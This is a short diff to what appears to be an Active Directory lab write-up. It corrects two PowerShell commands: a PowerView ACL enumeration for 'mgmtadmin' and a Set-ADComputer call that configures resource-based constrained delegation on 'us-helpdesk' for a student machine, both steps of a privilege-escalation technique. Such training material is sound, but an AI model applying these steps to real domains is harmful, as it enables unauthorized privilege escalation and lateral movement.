@@ -375,7 +375,7 @@ We already have access to a domain joined machine. Let's enumerate if we have Wr
 - PowerView
 
 ```
-Find-InterestingDomainAcl | ?{$_.identityreferencename match 'mgmtadmin'}
+Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'mgmtadmin'}
 ```
 
 <br/>
@@ -385,7 +385,7 @@ Using the ActiveDirectory module, configure RBCD on `us-helpdesk` for student ma
 ```
 $comps = 'student64$'
 
-Set-ADComputer -Identity us-helpdesk PrincipalsAllowedToDelegateToAccount $comps
+Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps
 ```
 
 <br/>
